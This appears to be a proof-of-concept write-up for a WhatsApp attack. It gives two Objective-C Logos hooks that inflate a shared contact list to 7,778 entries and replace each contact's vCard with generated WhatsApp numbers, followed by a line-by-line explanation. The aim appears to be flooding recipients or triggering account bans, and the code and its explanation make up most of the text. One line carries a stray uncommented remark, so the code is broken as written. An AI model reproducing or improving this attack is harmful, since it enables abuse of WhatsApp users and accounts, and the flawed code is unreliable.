
# PoC – Code Explanation Working Concept

This PoC uses Logos hooks to modify two WhatsApp classes:

- `WAMessageContentContactList`
- `WAMessageContentContact`

Each hook changes a different part of the contact data handling.

## 1. Contact List

```objc
%hook WAMessageContentContactList

- (id)contacts {

    NSArray *original = %orig;

    NSMutableArray *expanded = [NSMutableArray array];

    id base = [original firstObject];

    for (int i = 0; i < 7778; i++) {
        [expanded addObject:base];
    }

    return expanded;
}

%end
```

This hook intercepts the `contacts` method.

- `%orig` calls the original method and saves its result in `original`.
- `NSMutableArray` creates a new mutable array.
- `[original firstObject]` retrieves the first contact.
- The `for` loop repeats 7,778 times.
- `[expanded addObject:base]` adds the same contact object repeatedly.
- `return expanded` returns the modified array instead of the original one.

**Note:** The array contains repeated references to the same object, not 7,778 independent contacts.

## 2. vCard Serialization

```objc
%hook WAMessageContentContact

- (id)serializedVCard {

    static int counter = 0;

    int suffix = 8000 + counter++;

    NSString *phone = [NSString stringWithFormat:@"+39 999999 %04d", suffix];
    NSString *waid  = [NSString stringWithFormat:@"39999999%04d", suffix]; needs to be a valid whatsapp account number.

    NSString *vcard = [NSString stringWithFormat:
        @"BEGIN:VCARD\n"
         "VERSION:3.0\n"
         "N:;contact name here;;;\n"
         "FN:contact name here\n"
         "TEL;type=CELL;type=VOICE;waid=%@:%@\n"
         "END:VCARD",
         waid, phone
    ];

    return vcard;
}

%end
```

This hook intercepts `serializedVCard` and replaces the original method's return value with a custom vCard string.

### How it works

- `static int counter = 0` creates a counter that retains its value between method calls.
- `counter++` increments the counter after each call.
- `suffix` generates a numeric suffix.
- `phone` constructs a formatted telephone number.
- `waid` constructs a corresponding WhatsApp-related identifier.
- `vcard` contains the generated vCard data.
- `return vcard` returns the custom string.

### vCard Fields

| Field | Description |
|---|---|
| `BEGIN:VCARD` | Starts the vCard record. |
| `VERSION:3.0` | Defines the vCard version. |
| `N` | Structured contact name. |
| `FN` | Formatted contact name. |
| `TEL` | Telephone information. |
| `waid` | WhatsApp-related identifier. |
| `END:VCARD` | Ends the vCard record. |

The `%@` placeholders are replaced with the `waid` and `phone` strings through `stringWithFormat:`.

## 3. How the Hooks Work Together

Both hooks modify different methods:

- The first changes what the `contacts` method returns.
- The second changes what the `serializedVCard` method returns.

The first operates on the contact array, while the second modifies the serialized representation of a contact.

They are separate method overrides that affect related parts of contact data handling.

## 4. Code Notes

- `%hook` and `%end` define the Logos hook boundaries.
- `%orig` calls the original implementation.
- `static int` preserves the counter between method calls.
- `NSMutableArray` allows the contact array to be modified.
- `NSString` is used to construct the phone number, identifier, and vCard.
- The code assumes the original contact array contains at least one element.
- The repeated contacts are references to the same object.
- The code does not include outgoing-message or network transmission logic.

**Note:** This explanation describes what the supplied code does. It does not establish whether the modified data reaches another device or causes an account ban.
